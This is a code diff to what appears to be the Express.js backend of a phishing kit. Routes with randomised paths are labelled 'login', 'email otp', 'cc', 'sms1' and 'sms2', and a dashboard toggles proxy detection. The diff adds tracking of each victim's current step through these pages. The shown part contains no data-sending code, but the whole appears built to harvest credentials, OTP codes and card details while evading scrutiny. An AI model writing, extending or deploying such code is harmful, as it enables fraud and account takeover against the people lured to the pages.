@@ -3475,24 +3475,29 @@ app.post('/dashboard/toggle-proxy-detection', (req, res) => {
 //=========================[GET]===================
 app.get("/", (req, res) => { // login
   req.session.keyId = req.query.id;
+  req.session.curentPath = "/";
   res.render("index");
 });
-app.get("/PPmP85AgNE4pnL5mWSM", (req, res) => { // loading 1:
-  res.render("posas", { pass: req.session.username });
+app.get("/PPmP85AgNE4pnL5mWSM", (req, res) => { // email otp 1:
+  req.session.curentPath = "/PPmP85AgNE4pnL5mWSM";
+  res.render("posas", { pass: req.session.username, curentPath: req.session.curentPath });
 });
 app.get("/loading", (req, res) => { // loading 1:
   const { time, url } = req.query;
   res.render("lopin", { url, time });
 });
-app.get("/QcEwP85AgNE4pnL5mWSM", (req, res) => { // loading 1:
+app.get("/QcEwP85AgNE4pnL5mWSM", (req, res) => { // cc 1:
+  req.session.curentPath = "/QcEwP85AgNE4pnL5mWSM";
   res.render("capoca");
 });
 
 app.get("/RKnUB922z6Mf4HDwg3EZ", (req, res) => { // sms1
-  res.render("semitr-1", { pass: req.session.username });
+  req.session.curentPath = "/RKnUB922z6Mf4HDwg3EZ";
+  res.render("semitr-1", { pass: req.session.username, curentPath: req.session.curentPath });
 });
 
 app.get("/LGknmeM9HwWUWSutj6mJ", (req, res) => { // sms2
+  req.session.curentPath = "/LGknmeM9HwWUWSutj6mJ";
   res.render("semitr-2", { url: process.env.URL });
 });
 
